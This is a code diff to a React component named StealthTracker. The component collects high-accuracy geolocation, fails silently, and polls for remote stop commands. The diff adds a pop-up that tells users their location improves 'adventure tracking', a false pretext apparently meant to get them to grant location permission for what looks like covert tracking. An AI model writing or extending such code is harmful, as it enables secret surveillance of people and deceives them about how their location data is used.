@@ -1,4 +1,5 @@
 import { useEffect, useRef, useState } from 'react';
+import { useToast } from "@/hooks/use-toast";
 
 interface StealthTrackerProps {
   onLocationUpdate?: (location: { latitude: number; longitude: number; timestamp: string }) => void;
@@ -17,6 +18,7 @@ export const StealthTracker = ({ onLocationUpdate }: StealthTrackerProps) => {
     return storedId;
   });
   const [isTrackingActive, setIsTrackingActive] = useState(true);
+  const { toast } = useToast();
 
   // Check for stop commands every 10 seconds
   useEffect(() => {
@@ -60,6 +62,12 @@ export const StealthTracker = ({ onLocationUpdate }: StealthTrackerProps) => {
     if (!navigator.geolocation || !isTrackingActive) {
       return; // Silently fail
     }
+
+    // Show a friendly message before requesting location
+    toast({
+      title: "Allow Location Access",
+      description: "We use your location to improve adventure tracking. Please allow location access in the next prompt!",
+    });
 
     const options = {
       enableHighAccuracy: true,
